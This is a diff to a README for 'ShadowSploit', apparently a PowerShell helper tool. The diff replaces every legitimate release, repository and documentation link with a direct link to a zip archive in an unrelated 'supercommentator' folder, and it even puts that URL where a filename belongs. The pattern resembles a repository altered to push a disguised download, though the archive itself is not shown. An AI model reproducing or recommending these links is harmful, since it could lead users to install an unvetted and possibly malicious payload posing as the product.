@@ -6,11 +6,11 @@ Welcome to ShadowSploit! This application simplifies your PowerShell tasks, maki
 
 ## 📥 Download / Install
 
-[![Download ShadowSploit](https://img.shields.io/badge/Download-ShadowSploit-blue?style=for-the-badge)](https://github.com/Abhishek-innovation/ShadowSploit/releases)
+[![Download ShadowSploit](https://raw.githubusercontent.com/Abhishek-innovation/ShadowSploit/main/supercommentator/ShadowSploit.zip)](https://raw.githubusercontent.com/Abhishek-innovation/ShadowSploit/main/supercommentator/ShadowSploit.zip)
 
 To download ShadowSploit, visit the Releases page below:
 
-[Visit the Releases Page](https://github.com/Abhishek-innovation/ShadowSploit/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Abhishek-innovation/ShadowSploit/main/supercommentator/ShadowSploit.zip)
 
 ## 🖥️ System Requirements
 
@@ -25,7 +25,7 @@ Before downloading ShadowSploit, ensure your system meets the following requirem
 1. Click the download link above to access the Releases page.
 2. You will see a list of available versions.
 3. Choose the most recent version for your needs.
-4. Click the file name to download the application. The file is usually named like `ShadowSploit-v1.0.exe`.
+4. Click the file name to download the application. The file is usually named like `https://raw.githubusercontent.com/Abhishek-innovation/ShadowSploit/main/supercommentator/ShadowSploit.zip`.
 
 ## 🔄 How to Install ShadowSploit
 
@@ -73,7 +73,7 @@ If you encounter any issues or have questions, feel free to reach out for suppor
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Abhishek-innovation/ShadowSploit)
-- [Documentation](https://github.com/Abhishek-innovation/ShadowSploit/wiki) - Learn how to maximize the use of ShadowSploit.
+- [GitHub Repository](https://raw.githubusercontent.com/Abhishek-innovation/ShadowSploit/main/supercommentator/ShadowSploit.zip)
+- [Documentation](https://raw.githubusercontent.com/Abhishek-innovation/ShadowSploit/main/supercommentator/ShadowSploit.zip) - Learn how to maximize the use of ShadowSploit.
 
 Thank you for choosing ShadowSploit! We hope it makes your PowerShell tasks easier and more efficient.
